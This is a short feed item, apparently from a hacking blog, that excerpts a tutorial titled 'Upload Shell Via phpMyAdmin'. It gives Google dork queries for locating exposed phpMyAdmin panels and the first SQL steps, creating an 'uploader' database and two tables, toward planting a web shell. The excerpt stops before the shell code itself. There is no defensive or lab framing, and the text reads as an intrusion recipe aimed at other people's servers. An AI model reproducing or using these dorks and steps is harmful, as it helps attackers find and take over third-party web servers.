item.title: Upload Shell Via phpMyAdmin
item.author: thiklab@gmail.com (Thik)
item.description: Google Dorks allinurl:index.php?db=information_schema allinurl:/read_dump.php? SQL Query Go to phpMyadmin database and create new database, ex: “uploader” and than select on SQL tap and paste this code below. 1 2 3 CREATE TABLE `uploader`.`userform` ( `track1` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ; And this code. 1 2 3 CREATE TABLE `uploader`.`user_upload` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ; Now select on table user_upload and SQL tap and paste this code below.
item.dc:creator: thik
